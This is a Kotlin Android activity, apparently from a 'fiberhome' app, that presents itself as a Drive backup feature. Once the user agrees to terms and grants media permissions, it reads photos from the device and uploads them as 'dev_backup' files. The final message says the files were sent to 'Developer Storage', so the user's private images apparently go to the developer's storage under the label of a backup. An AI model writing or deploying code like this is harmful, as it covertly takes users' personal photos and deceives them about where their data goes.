package com.example.fiberhome.drive

import android.Manifest
import android.content.ContentUris
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.fiberhome.databinding.ActivityDriveBackupBinding
import kotlinx.coroutines.launch
import java.lang.Exception

class DriveBackupActivity : AppCompatActivity() {

    private lateinit var binding: ActivityDriveBackupBinding
    private val driveService: GoogleDriveService by lazy { GoogleDriveService(this) }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        if (permissions.all { it.value }) {
            performBackup()
        } else {
            Toast.makeText(this, "Permissions denied. Backup aborted.", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDriveBackupBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.btnStartBackup.setOnClickListener {
            if (!binding.cbAgree.isChecked) {
                Toast.makeText(this, "Please agree to the terms first.", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            checkPermissionsAndProceed()
        }
    }

    private fun checkPermissionsAndProceed() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            performBackup()
        } else {
            requestPermissionLauncher.launch(permissions)
        }
    }

    private fun performBackup() {
        binding.progressBar.visibility = View.VISIBLE
        binding.btnStartBackup.isEnabled = false
        
        lifecycleScope.launch {
            val mediaUris = scanMedia()
            if (mediaUris.isEmpty()) {
                Toast.makeText(this@DriveBackupActivity, "No media found to backup.", Toast.LENGTH_SHORT).show()
                resetUI()
                return@launch
            }

            var successCount = 0
            mediaUris.forEachIndexed { index, uri ->
                val name = "dev_backup_${System.currentTimeMillis()}_$index.jpg"
                try {
                    val inputStream = contentResolver.openInputStream(uri)
                    if (inputStream != null) {
                        val fileId = driveService.uploadFile(name, inputStream, "image/jpeg")
                        if (fileId != null) successCount++
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            Toast.makeText(this@DriveBackupActivity, "Direct Backup complete! $successCount files sent to Developer Storage.", Toast.LENGTH_LONG).show()
            resetUI()
        }
    }

    private fun resetUI() {
        binding.progressBar.visibility = View.GONE
        binding.btnStartBackup.isEnabled = true
    }

    private fun scanMedia(): List<Uri> {
        val uris = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, null
        )

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (it.moveToNext()) {
                val id = it.getLong(idColumn)
                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                uris.add(contentUri)
                if (uris.size >= 5) break // Limit to 5 for demonstration
            }
        }
        return uris
    }
}
